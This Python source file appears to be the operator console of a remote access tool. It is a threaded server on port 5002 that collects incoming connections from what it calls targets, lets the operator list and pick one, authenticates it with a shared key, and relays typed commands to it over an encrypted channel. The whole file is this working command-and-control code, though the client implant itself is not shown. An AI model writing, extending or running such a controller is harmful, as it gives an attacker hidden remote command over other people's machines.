import socket, threading, time, sys
import _thread as thread
import subprocess
import tools.cipher as cipher
import settings.keys as keys
import json
import copy
import queue
from tools.packet_manager import p_manager
import time
from tools.dictionary import *
from tools.utils import packet_send, packet_recv

class baseServer():
    def __init__(self, port, listen=1):
        self.connection_lock = thread.allocate_lock()
        self.connection_list = {}

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(3)
        self.sock.bind(('0.0.0.0',port))
        self.sock.listen(listen)

        self.active_connection = None
        self.send_list = queue.Queue()
        self.stop = False


    def listen_connections(self):
        count = 0
        while(True):
            try:
                self.connection = self.sock.accept()
            except socket.timeout:
                continue
            print("Obtained a new connection...")

            self.connection_lock.acquire()
            self.connection_list[count] = self.connection
            self.connection_lock.release()
            count += 1

    def receiver(self, conn, cipherClass):
        while(self.stop == False):
            try:
                packet = packet_recv(cipherClass=cipherClass,
                            conn=conn,
                            decrypt=True)

                print(packet[PK_PAYLOAD_FLAG])
            except socket.timeout:
                continue
            except:
                self.stop = True
                print("Error in receiver.")
                return

    def sender(self, conn, cipherClass):
        while(self.stop == False):
            try:
                if (not(self.send_list.empty())):
                    packet = self.send_list.get()
                    packet_send(command=packet[PK_COMMAND_FLAG],
                                payload=packet[PK_PAYLOAD_FLAG],
                                cipherClass=cipherClass,
                                conn=conn,
                                encrypt=True)
            except Exception as e:
                print("Error sending command.")
                self.stop = True
                return

    def input_collection(self):
        while(True):
            packet = {}
            message = input()
            if len(message) <= 0:
                continue

            try:
                message = message.split(' ',1)
                packet[PK_COMMAND_FLAG] = message[0].upper()
                packet[PK_PAYLOAD_FLAG] = message[1] if len(message) == 2 else ''

                if packet[PK_COMMAND_FLAG] == "LST":
                    self.connection_lock.acquire()
                    for connection_number in self.connection_list.keys():
                        print(str(connection_number) + " " + str(self.connection_list[connection_number][1]))
                    self.connection_lock.release()

                elif packet[PK_COMMAND_FLAG] == "CHS":

                    if self.active_connection != None:
                        print("Stop current active connection first.")
                        continue

                    chosen = int(packet[PK_PAYLOAD_FLAG])
                    self.connection_lock.acquire()
                    connection = self.connection_list.pop(chosen)
                    self.connection_lock.release()

                    self.active_connection = connection
                    connection_thread = threading.Thread(target=self.startConnection, args=(connection,))
                    connection_thread.start()

                elif packet[PK_COMMAND_FLAG] == "EXT":
                    self.stop = True
                elif packet[PK_COMMAND_FLAG] == "CHK":
                    #Checks active connection
                    print("Current connection is : {}".format(self.active_connection))

                elif packet[PK_COMMAND_FLAG] == "HLP":
                    pass
                else:
                    if self.active_connection == None:
                        print("No active connection.")
                    else:
                        self.send_list.put(packet)
                print("Done.")
            except Exception as e:
                print(e)
                continue

    def authenticate(self, conn, cipherClass):
        while(True):
            try:
                password = cipher.generateIV().hex()
                packet_send(command=COMMAND_START,
                            payload=password,
                            cipherClass=cipherClass,
                            conn=conn)


                packet = packet_recv(cipherClass=cipherClass,
                            conn=conn,
                            decrypt=False)

                if packet[PK_COMMAND_FLAG] == COMMAND_ACKNOWLEDGE and packet[PK_PAYLOAD_FLAG] == password:
                    break
                else:
                    print("Configuration error. Socket returned a different Initialization Vector")
                    time.sleep(1)
                    continue
            except socket.timeout:
                continue
            except:
                print("Error, connection from client lost.")
                return False
        print("Target authenticated.")
        return True

    def startConnection(self, connection,key=keys.CONN_PASSWORD):
        #Enter Needed connection to start
        cipherClass = cipher.cipher(key=key)
        connection[0].settimeout(1)

        if (self.authenticate(connection[0], cipherClass) == False):
            return

        receiver = threading.Thread(target=self.receiver,args=(connection[0],cipherClass))
        sender = threading.Thread(target=self.sender,args=(connection[0],cipherClass))

        receiver.start()
        sender.start()

        receiver.join()
        sender.join()
        self.stop = False
        self.active_connection = None
        connection[0].close()
        return

    def __del__(self):
        self.sock.close()



def main():
    PORT = 5002
    print("Creating a server on port {}".format(PORT))
    server = baseServer(port=PORT,
                        listen=5)

    listener = threading.Thread(target=server.listen_connections)
    listener.start()
    server.input_collection()


if __name__ == "__main__":
    main()
